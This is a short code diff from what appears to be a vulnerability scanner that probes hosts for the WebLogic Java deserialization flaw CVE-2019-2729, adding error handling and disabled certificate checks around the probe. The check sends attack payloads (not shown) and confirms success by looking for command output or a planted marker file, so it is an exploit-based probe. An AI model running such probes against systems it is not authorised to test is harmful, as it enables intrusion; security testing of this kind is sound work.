@@ -3544,14 +3544,17 @@ payload2 = '''
 
 
 def run(ip,port,index):
-    r1 = requests.post('http://' + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3)
-    time.sleep(1)
-    r2 = requests.post('http://' + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3)
-    time.sleep(1)
-    r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico')
-    if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
-       print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2019-2729)\n\t'+Vcolors.ENDC)
-       a = ip+":"+port+":检测存在JAVA deserialization漏洞(CVE-2019-2729)"
-       return a
-    else:
-       pass
+    try:
+        r1 = requests.post('http://' + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3,verify=False)
+        time.sleep(1)
+        r2 = requests.post('http://' + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3,verify=False)
+        time.sleep(1)
+        r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico',verify=False)
+        if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
+           print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2019-2729)\n\t'+Vcolors.ENDC)
+           a = ip+":"+port+":检测存在JAVA deserialization漏洞(CVE-2019-2729)"
+           return a
+        else:
+           pass
+    except:
+        pass
